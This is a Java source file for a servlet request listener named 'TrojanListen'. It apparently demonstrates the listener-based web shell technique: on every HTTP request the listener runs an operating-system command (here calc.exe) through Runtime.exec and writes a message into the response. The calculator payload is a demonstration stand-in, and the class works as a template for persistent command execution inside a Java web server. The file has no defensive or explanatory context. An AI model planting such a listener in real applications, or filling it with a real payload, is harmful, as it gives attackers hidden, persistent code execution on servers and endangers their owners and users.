package listen;

import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.ServletResponse;


public class TrojanListen implements ServletRequestListener {

    public ServletRequest request;
    public ServletResponse response;

    public TrojanListen(ServletRequest request, ServletResponse response) {
        this.request = request;
        this.response = response;
    }
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            Process ps = Runtime.getRuntime().exec("calc.exe");
            response.getWriter().write("Open a calc.exe");
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }
}
